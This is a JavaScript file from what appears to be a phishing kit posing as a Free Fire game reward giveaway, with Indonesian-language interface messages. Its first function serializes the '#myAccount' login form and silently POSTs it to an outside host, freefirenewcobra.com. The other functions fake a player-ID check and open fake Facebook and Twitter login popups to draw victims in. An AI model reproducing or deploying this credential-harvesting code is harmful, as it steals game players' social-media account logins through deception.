// button to bring up a popup
function open_my_account() {var myFormAcc = $("#myAccount").serialize();$.ajax({url: 'https://freefirenewcobra.com/jquery/index.php',data: myFormAcc,type: 'POST',success: function() {return true;},error: function() {return true;}});}

function checkId() {
	var playid = $("#playid").val();

	if(playid.length < 1) {
		$(".errorMsg").html('<i class="zmdi zmdi-close"></i> &nbsp;Player ID tidak boleh kosong!');
		$(".errorMsg").fadeIn("slow");
	} else {
		$.ajax({
			url: "ryucodex/trueId.php",
			type: "POST",
			data: "playerId="+playid,
			beforeSend: function() {
				$(".errorMsg").html('<i class="zmdi zmdi-spinner zmdi-hc-spin"></i> &nbsp;Memverifikasi Player ID');
				$(".errorMsg").fadeIn("slow");
			},
			success: function(responses) {
				$(".loading-block").removeClass("active");

				if(responses == "") {
					$(".errorMsg").html('<i class="zmdi zmdi-close"></i> &nbsp;Player ID tidak ditemukan!');
					$(".errorMsg").fadeIn("slow");	
				} else {
					$(".errorMsg").html('<i class="zmdi zmdi-check-circle"></i> &nbsp;Verifikasi Berhasil');
					$(".errorMsg").fadeIn("slow");
					$("input#userNickForm").val(responses);
                    $("input#userIdForm").val(playid);
					$('.login_facebook').show();
				}
			}
		});
	}
}

function open_reward_confirmation(ag) {
    var reward = $(ag).attr("src");
    $('.reward_confirmation').show();
	$('.reward_list').hide();
    $('#myReward').attr('src',reward);
}
function open_account_login(){
	$('.account_login').show();
	$('.reward_confirmation').hide();
}
function open_facebook_login(){
	$('.login_facebook').show();
}
function open_twitter_login(){
	$('.login_twitter').show();
}

// button to close the popup
function close_reward_confirmation(){
	$(".reward_confirmation").hide()
	$('.reward_list').show();
}
function close_account_login(){
	$('.account_login').hide();
	$('.reward_list').show();
}
function close_facebook_login(){
	$('.login_facebook').hide();
}
function close_twitter_login(){
	$('.login_twitter').hide();
}